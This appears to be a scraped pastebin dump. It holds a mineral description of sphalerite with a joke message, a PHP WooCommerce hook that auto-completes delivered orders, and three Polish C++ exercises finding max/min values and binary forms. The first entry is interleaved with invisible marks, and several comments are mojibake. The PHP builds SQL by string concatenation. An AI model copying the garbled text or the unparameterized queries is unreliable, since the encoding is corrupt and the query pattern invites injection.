S‚Äép‚Äéh‚Äéa‚Äél‚Äée‚Äér‚Äéi‚Äét‚Äée‚Äé ‚Äéi‚Äés‚Äé ‚Äéa‚Äé ‚Äés‚Äéu‚Äél‚Äéf‚Äéi‚Äéd‚Äée‚Äé ‚Äém‚Äéi‚Äén‚Äée‚Äér‚Äéa‚Äél‚Äé ‚Äéw‚Äéi‚Äét‚Äéh‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äéc‚Äéh‚Äée‚Äém‚Äéi‚Äéc‚Äéa‚Äél‚Äé ‚Äéf‚Äéo‚Äér‚Äém‚Äéu‚Äél‚Äéa‚Äé ‚Äé(‚ÄéZ‚Äén‚Äé,‚ÄéF‚Äée‚Äé)‚ÄéS‚Äé.‚Äé ‚ÄéI‚Äét‚Äé ‚Äéi‚Äés‚Äé ‚Äéf‚Äéo‚Äéu‚Äén‚Äéd‚Äé ‚Äéi‚Äén‚Äé ‚Äéa‚Äé ‚Äév‚Äéa‚Äér‚Äéi‚Äée‚Äét‚Äéy‚Äé ‚Äéo‚Äéf‚Äé ‚Äéd‚Äée‚Äép‚Äéo‚Äés‚Äéi‚Äét‚Äé ‚Äét‚Äéy‚Äép‚Äée‚Äés‚Äé,‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äéi‚Äés‚Äé ‚Äéf‚Äéo‚Äéu‚Äén‚Äéd‚Äé ‚Äéi‚Äén‚Äé ‚Äéa‚Äés‚Äés‚Äéo‚Äéc‚Äéi‚Äéa‚Äét‚Äéi‚Äéo‚Äén‚Äé ‚Äéw‚Äéi‚Äét‚Äéh‚Äé ‚Äég‚Äéa‚Äél‚Äée‚Äén‚Äéa‚Äé,‚Äé ‚Äéc‚Äéh‚Äéa‚Äél‚Äéc‚Äéo‚Äép‚Äéy‚Äér‚Äéi‚Äét‚Äée‚Äé,‚Äé ‚Äép‚Äéy‚Äér‚Äéi‚Äét‚Äée‚Äé ‚Äé(‚Äéa‚Äén‚Äéd‚Äé ‚Äéo‚Äét‚Äéh‚Äée‚Äér‚Äé ‚Äés‚Äéu‚Äél‚Äéf‚Äéi‚Äéd‚Äée‚Äés‚Äé)‚Äé,‚Äé ‚Äéc‚Äéa‚Äél‚Äéc‚Äéi‚Äét‚Äée‚Äé,‚Äé ‚Äéd‚Äéo‚Äél‚Äéo‚Äém‚Äéi‚Äét‚Äée‚Äé,‚Äé ‚Äéq‚Äéu‚Äéa‚Äér‚Äét‚Äéz‚Äé,‚Äé ‚Äér‚Äéh‚Äéo‚Äéd‚Äéo‚Äéc‚Äéh‚Äér‚Äéo‚Äés‚Äéi‚Äét‚Äée‚Äé,‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äéf‚Äél‚Äéu‚Äéo‚Äér‚Äéi‚Äét‚Äée‚Äé.‚Äé ‚ÄéS‚Äép‚Äéh‚Äéa‚Äél‚Äée‚Äér‚Äéi‚Äét‚Äée‚Äé ‚Äéi‚Äés‚Äé ‚Äéa‚Äén‚Äé ‚Äéi‚Äém‚Äép‚Äéo‚Äér‚Äét‚Äéa‚Äén‚Äét‚Äé ‚Äéo‚Äér‚Äée‚Äé ‚Äéo‚Äéf‚Äé ‚Äéz‚Äéi‚Äén‚Äéc‚Äé,‚Äé ‚Äéw‚Äéi‚Äét‚Äéh‚Äé ‚Äéa‚Äér‚Äéo‚Äéu‚Äén‚Äéd‚Äé ‚Äé9‚Äé5‚Äé%‚Äé ‚Äéo‚Äéf‚Äé ‚Äéa‚Äél‚Äél‚Äé ‚Äép‚Äér‚Äéi‚Äém‚Äéa‚Äér‚Äéy‚Äé ‚Äéz‚Äéi‚Äén‚Äéc‚Äé ‚Äée‚Äéx‚Äét‚Äér‚Äéa‚Äéc‚Äét‚Äée‚Äéd‚Äé ‚Äéf‚Äér‚Äéo‚Äém‚Äé ‚Äéi‚Äét‚Äés‚Äé ‚Äéo‚Äér‚Äée‚Äé.‚Äé ‚ÄéD‚Äéu‚Äée‚Äé ‚Äét‚Äéo‚Äé ‚Äéi‚Äét‚Äés‚Äé ‚Äév‚Äéa‚Äér‚Äéi‚Äéa‚Äéb‚Äél‚Äée‚Äé ‚Äét‚Äér‚Äéa‚Äéc‚Äée‚Äé ‚Äée‚Äél‚Äée‚Äém‚Äée‚Äén‚Äét‚Äé ‚Äéc‚Äéo‚Äén‚Äét‚Äée‚Äén‚Äét‚Äé,‚Äé ‚Äés‚Äép‚Äéh‚Äéa‚Äél‚Äée‚Äér‚Äéi‚Äét‚Äée‚Äé ‚Äéi‚Äés‚Äé ‚Äéa‚Äél‚Äés‚Äéo‚Äé ‚Äéa‚Äén‚Äé ‚Äéi‚Äém‚Äép‚Äéo‚Äér‚Äét‚Äéa‚Äén‚Äét‚Äé ‚Äés‚Äéo‚Äéu‚Äér‚Äéc‚Äée‚Äé ‚Äéo‚Äéf‚Äé ‚Äés‚Äée‚Äév‚Äée‚Äér‚Äéa‚Äél‚Äé ‚Äéo‚Äét‚Äéh‚Äée‚Äér‚Äé ‚Äém‚Äée‚Äét‚Äéa‚Äél‚Äés‚Äé ‚Äés‚Äéu‚Äéc‚Äéh‚Äé ‚Äéa‚Äés‚Äé ‚Äéc‚Äéa‚Äéd‚Äém‚Äéi‚Äéu‚Äém‚Äé,‚Äé ‚Äég‚Äéa‚Äél‚Äél‚Äéi‚Äéu‚Äém‚Äé,‚Äé ‚Äég‚Äée‚Äér‚Äém‚Äéa‚Äén‚Äéi‚Äéu‚Äém‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äéi‚Äén‚Äéd‚Äéi‚Äéu‚Äém‚Äé.‚Äé ‚ÄéT‚Äéh‚Äée‚Äé ‚Äéz‚Äéi‚Äén‚Äéc‚Äé ‚Äéi‚Äén‚Äé ‚Äés‚Äép‚Äéh‚Äéa‚Äél‚Äée‚Äér‚Äéi‚Äét‚Äée‚Äé ‚Äéi‚Äés‚Äé ‚Äéa‚Äél‚Äés‚Äéo‚Äé ‚Äéu‚Äés‚Äée‚Äéd‚Äé ‚Äét‚Äéo‚Äé ‚Äép‚Äér‚Äéo‚Äéd‚Äéu‚Äéc‚Äée‚Äé ‚Äéb‚Äér‚Äéa‚Äés‚Äés‚Äé.‚Äé ‚ÄéT‚Äéh‚Äéi‚Äés‚Äé ‚Äés‚Äép‚Äéh‚Äéa‚Äél‚Äée‚Äér‚Äéi‚Äét‚Äée‚Äé ‚Äés‚Äéa‚Äém‚Äép‚Äél‚Äée‚Äé ‚Äéw‚Äéa‚Äés‚Äé ‚Äée‚Äéx‚Äét‚Äér‚Äéa‚Äéc‚Äét‚Äée‚Äéd‚Äé ‚Äéi‚Äén‚Äé ‚ÄéC‚Äér‚Äée‚Äée‚Äéd‚Äée‚Äé,‚Äé ‚ÄéC‚Äéo‚Äél‚Äéo‚Äér‚Äéa‚Äéd‚Äéo‚Äé,‚Äé ‚ÄéU‚Äén‚Äéi‚Äét‚Äée‚Äéd‚Äé ‚ÄéS‚Äét‚Äéa‚Äét‚Äée‚Äés‚Äé.‚Äé

P‚Äéh‚Äéo‚Äét‚Äéo‚Äég‚Äér‚Äéa‚Äép‚Äéh‚Äé ‚Äéc‚Äér‚Äée‚Äéd‚Äéi‚Äét‚Äé:‚Äé ‚ÄéI‚Äév‚Äéa‚Äér‚Äé ‚ÄéL‚Äée‚Äéi‚Äéd‚Äéu‚Äés‚Äé

.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé

H‚Äée‚Äéy‚Äé,‚Äé ‚Äég‚Äéu‚Äéy‚Äés‚Äé.‚Äé ‚ÄéR‚Äéi‚Äéc‚Äéa‚Äér‚Äéd‚Äéo‚Äé ‚Äé9‚Äé0‚Äé0‚Äé0‚Äé ‚Äéh‚Äée‚Äér‚Äée‚Äé.‚Äé ‚ÄéI‚Äé'‚Äém‚Äé ‚Äég‚Äéo‚Äén‚Äén‚Äéa‚Äé ‚Äég‚Äéo‚Äé ‚Äés‚Äép‚Äér‚Äéa‚Äéy‚Äé ‚Äés‚Äéo‚Äém‚Äée‚Äé ‚Äéo‚Äéf‚Äé ‚Äém‚Äéy‚Äé ‚Äéf‚Äéa‚Äém‚Äéo‚Äéu‚Äés‚Äé ‚ÄéJ‚Äéa‚Äél‚Äéa‚Äép‚Äée‚Äé√±‚Äéo‚Äé ‚Äéh‚Äéo‚Äét‚Äé ‚Äés‚Äéa‚Äéu‚Äéc‚Äée‚Äé ‚Äéa‚Äét‚Äé ‚Äés‚Äéo‚Äém‚Äée‚Äé ‚ÄéF‚Äér‚Äée‚Äén‚Äéc‚Äéh‚Äé ‚Äép‚Äée‚Äéo‚Äép‚Äél‚Äée‚Äé,‚Äé ‚Äét‚Äéh‚Äée‚Äén‚Äé ‚ÄéI‚Äé'‚Äém‚Äé ‚Äég‚Äéo‚Äén‚Äén‚Äéa‚Äé ‚Äég‚Äéo‚Äé ‚Äéb‚Äél‚Äéa‚Äés‚Äét‚Äé ‚Äés‚Äéo‚Äém‚Äée‚Äé ‚Äém‚Äéa‚Äér‚Äéi‚Äéa‚Äéc‚Äéh‚Äéi‚Äé ‚Äém‚Äéu‚Äés‚Äéi‚Äéc‚Äé ‚Äéf‚Äér‚Äéo‚Äém‚Äé ‚Äém‚Äéy‚Äé ‚Äér‚Äéa‚Äéd‚Äéi‚Äéo‚Äé.‚Äé ‚ÄéI‚Äét‚Äé'‚Äés‚Äé ‚Äég‚Äéo‚Äén‚Äén‚Äéa‚Äé ‚Äéb‚Äée‚Äé ‚Äér‚Äée‚Äéa‚Äél‚Äél‚Äéy‚Äé ‚Äéa‚Äén‚Äén‚Äéo‚Äéy‚Äéi‚Äén‚Äég‚Äé.‚Äé ‚ÄéL‚Äéa‚Äét‚Äéi‚Äén‚Äéx‚Äé ‚Äép‚Äéo‚Äéw‚Äée‚Äér‚Äé!‚Äé ‚ÄéL‚Äéa‚Äét‚Äéi‚Äén‚Äéx‚Äé ‚Äép‚Äéo‚Äéw‚Äée‚Äér‚Äé!‚Äé ‚ÄéL‚Äéa‚Äét‚Äéi‚Äén‚Äéx‚Äé ‚Äép‚Äéo‚Äéw‚Äée‚Äér‚Äé ‚ÄéL‚Äéa‚Äét‚Äéi‚Äén‚Äéx‚Äé ‚Äép‚Äéo‚Äéw‚Äée‚Äér‚Äé ‚ÄéL‚Äéa‚Äét‚Äéi‚Äén‚Äéx‚Äé ‚Äép‚Äéo‚Äéw‚Äée‚Äér‚Äé ‚ÄéL‚Äéa‚Äét‚Äéi‚Äén‚Äéx‚Äé ‚Äép‚Äéo‚Äéw‚Äée‚Äér‚Äé!‚Äé ‚ÄéL‚Äéa‚Äét‚Äéi‚Äén‚Äéx‚Äé ‚Äép‚Äéo‚Äéw‚Äée‚Äér‚Äé!‚Äé"
QXGKm7jm,Mark order complete when all items delivered,palsushobhan,PHP,Monday 29th of April 2024 08:53:30 AM CDT,"add_action( 'wcfmd_after_order_mark_delivered', 'wcfm_order_marked_completed_forcefully',20);
add_action( 'wcfmd_after_order_item_mark_delivered', 'wcfm_order_marked_completed_forcefully',20);
function wcfm_order_marked_completed_forcefully($order_id) {
    global $wpdb;

    $order = wc_get_order($order_id);
    if (empty($order)) return;

    $sql = 'SELECT count(ID) FROM ' . $wpdb->prefix . 'wcfm_marketplace_orders';
    $sql .= ' WHERE 1=1';
    $sql .= "" AND `order_id` = "" . $order_id;
    $sql .= "" AND shipping_status NOT IN ('shipped','completed')"";
    $sql .= "" AND commission_status != 'completed'"";
    $results = $wpdb->get_var( $sql );
    if($results) return;

    $sql  = ""SELECT count(ID) FROM `{$wpdb->prefix}wcfm_delivery_orders`"";
    $sql .= "" WHERE 1=1"";
    $sql .= "" AND order_id = {$order_id}"";
    $sql .= "" AND delivery_status != 'delivered'"";
    $results = $wpdb->get_var( $sql );
    if($results) return;

    $order->update_status( 'completed' );
}"
SMEi28z7,Untitled,MeehoweCK,C++,Monday 29th of April 2024 08:49:08 AM CDT,"#include <fstream>
#include <vector>
#include <iostream>

void maxmin(const std::vector<int>& wektor, int &maxLiczba, int &minLiczba) {
	auto rozmiar{ wektor.size() };

	maxLiczba = wektor[0];
	minLiczba = wektor[0];

	for (auto i{ 1 }; i < rozmiar; ++i) {
		if (wektor[i] > maxLiczba) {
			maxLiczba = wektor[i];
		}
		else if (wektor[i] < minLiczba) {
			minLiczba = wektor[i];
		}
	}
}

std::string odwrocCiag(const std::string& ciag) {
	std::string wynik{};
	for (int i{ static_cast<int>(ciag.size() - 1) }; i >= 0; --i) {
		wynik += ciag[i];
	}
	return wynik;
}

std::string zamienNaBinarna(int liczba) {
	std::string wynik{};
	while (liczba > 0) {
		wynik += (liczba % 2 == 0 ? '0' : '1');
		liczba /= 2;
	}
	return odwrocCiag(wynik);
}

int main() {
	std::ifstream plik{ ""liczby.txt"" };		// utworzenie obiektu wyj≈õcia z pod≈ÇƒÖczonym plikiem txt
	int liczba;
	std::vector<int> wektorLiczb{};			// zainicjowanie pustego wektora przechowujƒÖcego liczby
	while (plik >> liczba) {
		wektorLiczb.push_back(liczba);		// dodanie liczby do wektora
	}
	plik.close();

	int maxLiczba, minLiczba;
	maxmin(wektorLiczb, maxLiczba, minLiczba);
	std::cout << ""Najwieksza liczba wynosi "" << maxLiczba << "", a najmniejsza wynosi "" << minLiczba << std::endl;

	std::cout << ""Liczby w zapisie binarnym:\n"";
	for (const auto& x : wektorLiczb) {
		std::cout << '\t' << x << '\t' << zamienNaBinarna(x) << std::endl;
	}

	std::cout << ""Zapis binarny najwiekszej liczby: "" << zamienNaBinarna(maxLiczba) << std::endl;
	return 0;
}"
zSyct2dx,Untitled,MeehoweCK,C++,Monday 29th of April 2024 08:34:39 AM CDT,"#include <fstream>
#include <vector>
#include <iostream>

void maxmin(const std::vector<int>& wektor, int &maxLiczba, int &minLiczba) {
	auto rozmiar{ wektor.size() };

	maxLiczba = wektor[0];
	minLiczba = wektor[0];

	for (auto i{ 1 }; i < rozmiar; ++i) {
		if (wektor[i] > maxLiczba) {
			maxLiczba = wektor[i];
		}
		else if (wektor[i] < minLiczba) {
			minLiczba = wektor[i];
		}
	}
}

int main() {
	std::ifstream plik{ ""liczby.txt"" };		// utworzenie obiektu wyj≈õcia z pod≈ÇƒÖczonym plikiem txt
	int liczba;
	std::vector<int> wektorLiczb{};			// zainicjowanie pustego wektora przechowujƒÖcego liczby
	while (plik >> liczba) {
		wektorLiczb.push_back(liczba);		// dodanie liczby do wektora
	}
	plik.close();

	//std::cout << wektorLiczb.size() << std::endl;		// wy≈õwietlenie rozmiaru wektora
	//std::cout << ""Pobrane liczby:\n"";
	//
	//for (const auto& x : wektorLiczb) {	
	//	std::cout << x << std::endl;
	//}

	int maxLiczba, minLiczba;
	maxmin(wektorLiczb, maxLiczba, minLiczba);
	std::cout << ""Najwieksza liczba wynosi "" << maxLiczba << "", a najmniejsza wynosi "" << minLiczba << std::endl;
	return 0;
}"
QH5UyhnC,Untitled,MeehoweCK,C++,Monday 29th of April 2024 08:28:14 AM CDT,"#include <fstream>
#include <vector>
#include <iostream>

int max(const std::vector<int>& wektor) {
	auto rozmiar{ wektor.size() };
	auto wynik{ wektor[0] };
	for (auto i{ 1 }; i < rozmiar; ++i) {
		if (wektor[i] > wynik) {
			wynik = wektor[i];
		}
	}
	return wynik;
}

int main() {
	std::ifstream plik{ ""liczby.txt"" };		// utworzenie obiektu wyj≈õcia z pod≈ÇƒÖczonym plikiem txt
	int liczba;
	std::vector<int> wektorLiczb{};			// zainicjowanie pustego wektora przechowujƒÖcego liczby
	while (plik >> liczba) {
		wektorLiczb.push_back(liczba);		// dodanie liczby do wektora
	}
	std::cout << wektorLiczb.size() << std::endl;		// wy≈õwietlenie rozmiaru wektora
	std::cout << ""Pobrane liczby:\n"";
	/*for (auto i{ 0 }; i < wektorLiczb.size(); ++i) {
		std::cout << wektorLiczb[i] << std::endl;
	}*/
	for (const auto& x : wektorLiczb) {		// pƒôtla zakresowa for - dzia≈Ça tak samo jak ta wykomentowana powy≈ºej
		std::cout << x << std::endl;
	}
	std::cout << ""Najwieksza liczba wynosi "" << max(wektorLiczb) << std::endl;
	return 0;
}"
